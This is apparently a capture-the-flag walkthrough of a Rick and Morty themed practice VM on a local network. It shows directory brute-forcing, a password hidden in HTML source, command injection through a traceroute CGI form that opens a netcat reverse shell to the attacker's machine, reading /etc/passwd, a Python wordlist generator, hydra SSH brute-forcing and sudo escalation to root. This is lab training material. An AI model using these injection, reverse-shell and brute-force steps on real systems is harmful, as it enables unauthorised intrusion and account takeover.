first go to http://192.168.1.10:9090

there is our first flag 


FLAG {There is no Zeus, in your face!} - 10 Points


now let brute force directories with dirb

# go to http://192.168.1.10/passwords/FLAG.txt

FLAG{Yeah d- just don't do it.} - 10 Points here is another flag


# go to http://192.168.1.10/passwords/passwords.html

open the source code 

<!--Password: winter-->

let it just be here till we find what's password is this.



# now go to http://192.168.1.10/cgi-bin/

there is a form that takes an ip and traceroute it 

there might be a code injection here

lets see, enter 192.168.1.0 ; ls -la

yes we executed the code on the server 

now lets get a reverse shell

first set up a listener on the local machine

$ nc -lnvp 4444

now on the target machine type

192.168.1.0; nc -c bash 192.168.1.6 4444

and we got the shell


lets see system users

cat command desnot work
lets use less command

$ less /etc/passwd

RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash


lets try ssh with this usernames and with password winter 

it worked for summer

$ ssh -l Summer 192.168.1.0 -p 22222

$ ls
FLAG.txt

$ less FLAG.txt

FLAG{Get off the high road Summer!} - 10 Points


lets navigate around to see what we have 

$ cd /home

$ ls 
Morty  RickSanchez  Summer
$ cd Morty
$ ls
journal.txt.zip  Safe_Password.jpg

I used simple python http server to download this files

$ python -m SimpleHTTPServer

and in my local machine I look in the Safe_Password.jpg

$ strings Safe_Password.jpg

8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek

I saw this line

and used this password to opne journal.txt.zip

and in that file 




Monday: So today Rick told me huge secret.
He had finished his flask and was on to commercial grade paint solvent.
He spluttered something about a safe, and a password.
Or maybe it was a safe password... 
Was a password that was safe? 
Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points



lets look at some other areas

$ nc 192.168.1.10 13337

FLAG:{TheyFoundMyBackDoorMorty}-10Points

till now 60 points

$ nc 192.168.1.0 60000
FLAG{Flip the pickle Morty!} - 10 Points

$whoami
root

this is a root backdoor, but a restricted one


lets look at some ftp protocol

https://www.howtoforge.com/tutorial/how-to-use-ftp-on-the-linux-shell/
there is a good article about ftp


lets go to ftp://192.168.1.10

we see there is a flag file and pub directory

download flag file and read it

FLAG{Whoa this is unexpected} - 10 Points



# now lets move on to the rick home directory and see what he's got.

cd /home/RickSanchez/RICKS_SAFE

there is a file called safe in this directory 
used pythonhttpserver  to download it


when I executed it I saw
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!

but when I executed it wiht password we found before 

$ ./safe 131333

decrypt: 	FLAG{And Awwwaaaaayyyy we Go!} - 20 Points

Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order


1 uppercase character
1 digit
One of the words in my old bands name.ï¿½	@

When I googled it I found that "The Flesh Curtains"
is ricks old band name

and I wrote a python script to generate the desired password

upper_case = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
digit="0123456789"
band_name="Flesh"
band_name_word2 = "Curtains"

for i in upper_case:
    for j in digit:
        for k in band_name:
            print(i+j+band_name)
            print(i+j+band_name_word2)
			
$python password_gen > passwords.txt

and used hydra to brute force ssh service
$ hydra -s 22222 -l RickSanchez -P passwords.txt 192.168.1.10 -t 4 ssh -V

and the password is P7Curtains

let ssh into ricks account

$ ssh -l RickSanchez 192.168.1.10

and we are in

$ sudo -l

$ sudo su 
$ whoami
root

cd /root
less FLAG.txt

FLAG: {Ionic Defibrillator} - 30 points

and the last flag
